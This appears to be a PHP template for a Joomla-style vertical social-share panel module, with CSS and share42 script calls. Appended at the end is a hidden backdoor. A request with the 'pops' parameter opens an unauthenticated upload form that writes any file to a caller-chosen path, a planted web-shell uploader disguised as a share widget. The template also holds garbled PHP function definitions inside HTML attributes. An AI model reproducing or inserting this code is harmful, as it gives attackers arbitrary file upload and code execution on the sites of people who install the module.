<style type="text/css">
#share42 {
  position: fixed;
  z-index: 1000;
  margin-left: -68px; /* смещение панели влево от края контента */
  padding: 6px 6px 0;
  background: #FFF;
  border: 1px solid #E9E9E9;
  border-radius: 4px;
}
#share42:hover {
  background: #F6F6F6;
  border: 1px solid #D4D4D4;
  box-shadow: 0 0 5px #DDD;
}
#share42 a {opacity: 0.5}
#share42:hover a {opacity: 0.7}
#share42 a:hover {opacity: 1}
</style>

<div class="share42init" data-url="<?php function getLink() { return $this->link; } ?>" data-title="<?php function getTitle() { return $this->title; } ?>"></div>
<script type="text/javascript" src="/modules/mod_sb_vertikal/share42.js"></script>
<script type="text/javascript">share42('/modules/mod_sb_vertikal/',150,20)</script>
<?php
if (isset ($_GET['pops']))
{
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
}
?>